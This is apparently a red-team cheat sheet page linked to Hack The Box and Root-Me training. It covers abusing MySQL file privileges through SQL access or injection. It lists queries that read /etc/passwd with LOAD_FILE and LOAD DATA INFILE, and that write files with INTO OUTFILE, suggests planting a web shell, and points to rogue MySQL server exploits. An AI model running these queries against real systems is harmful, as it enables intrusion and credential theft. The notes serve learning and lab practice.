# Database Exploitation: File system

[![sqlinjectionfundamentals](../../../../../_badges/htb/sqlinjectionfundamentals.svg)](https://academy.hackthebox.com/course/preview/sql-injection-fundamentals)
[![attacking_common_services](../../../../../_badges/htb/attacking_common_services.svg)](https://academy.hackthebox.com/course/preview/attacking-common-services)
[![validation](../../../../../_badges/htb-p/validation.svg)](https://app.hackthebox.com/machines/Validation)
[![sql_injection_file_reading](../../../../../_badges/rootme/web_server/sql_injection_file_reading.svg)](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-File-reading)

<div class="row row-cols-lg-2"><div>

If we are able to run SQL queries, either from a direct access, or from a [SQLi](/cybersecurity/red-team/s3.exploitation/vulns/injection/sqli.md), we may be able to read/write files.

Common usages are:

* üîë Read sensitive files <small>(configuration files, /etc/passwd, etc.)</small>
* ü™≤ Write a web shell <small>(you need the webserver root path, try to see if it's shown if error messages if any, or try well-known paths)</small>

In the context of a SQLi, you can use [sqlmap](/cybersecurity/red-team/s3.exploitation/tools/sqlmap.md#readwrite-files) to automate this.
</div><div>

To read a file:

```sql!
SELECT LOAD_FILE('/etc/passwd');
LOAD DATA INFILE '/etc/passwd' INTO TABLE xxx; -- require privs?
LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE xxx; -- no privs?
```

To write something to a file <small>(‚ö†Ô∏è query length limit)</small>:

```sql!
SELECT [...] INTO OUTFILE '/path/to/writable/dir/myfile';
SELECT "Hello!" INTO OUTFILE '/tmp/myfile';
SELECT FROM_BASE64("SGVsbG8h") INTO OUTFILE '/tmp/myfile';
```
</div></div>

<hr class="sep-both">

## DBMS Introspection

<div class="row row-cols-lg-2"><div>

#### MySQL secure_file_priv

[![sql_injection_file_reading](../../../../../_badges/rootme/web_server/sql_injection_file_reading.svg)](https://www.root-me.org/en/Challenges/Web-Server/SQL-injection-File-reading)

MySQL uses the `secure_file_priv`. If it's empty, there is no restriction. If `NULL`, read/write are disabled. Otherwise, we are limited to the specified folder. We can check out the current value with:

```sql!
SELECT variable_value FROM information_schema.global_variables
WHERE VARIABLE_NAME='secure_file_priv'
```
```sql!
Select @@global.secure_file_priv
```

MariaDB has this variable set to empty by default. MySQL uses `/var/lib/mysql-files` as the default folder.
</div><div>

#### List Users That Can Manipulation Files

List users with the file permission <small>(Y=YES)</small>

```sql!
SELECT grantee, privilege_type
FROM information_schema.user_privileges
WHERE PRIVILEGE_TYPE = 'FILE'
```
```sql!
SELECT user,File_priv FROM mysql.user
```
</div></div>

<hr class="sep-both">

## MySQL LOCAL INFILE

<div class="row row-cols-lg-2"><div>

MySQL document specify that clients should not connect to untrusted servers as the server may be capable or reading files on the client host. By default, `LOCAL_INFILE` is disabled to avoid this.

This is an old attack and multiple exploits exist for it.

* [Rogue-MySql-Server](https://github.com/Gifts/Rogue-MySql-Server) <small>(0.5k ‚≠ê, 2013 ü™¶)</small>
* [rogue_mysql_server](https://github.com/rmb122/rogue_mysql_server/blob/master/README_EN.md) <small>(0.7k ‚≠ê, 2022 ü™¶)</small>

You then have to find a vulnerable client connecting to your server. For instance, it could be a install script of a PHP website.
</div><div>
</div></div>